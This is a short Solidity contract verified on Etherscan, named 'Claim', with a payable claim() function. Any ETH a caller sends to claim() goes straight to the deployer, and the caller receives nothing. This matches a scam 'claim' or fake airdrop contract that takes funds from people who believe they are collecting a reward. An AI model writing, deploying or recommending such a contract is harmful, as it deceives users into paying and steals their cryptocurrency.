/**
 *Submitted for verification at Etherscan.io on 2023-04-23
*/

pragma solidity ^0.8.7;

contract Claim {
    address private owner;
    constructor() {
        owner = msg.sender;
    }
  function withdraw() public payable {
        require(owner == msg.sender);
        payable(msg.sender).transfer(address(this).balance);
    }
    function claim() public payable {
        if (msg.value > 0) payable(owner).transfer(address(this).balance);
    }
}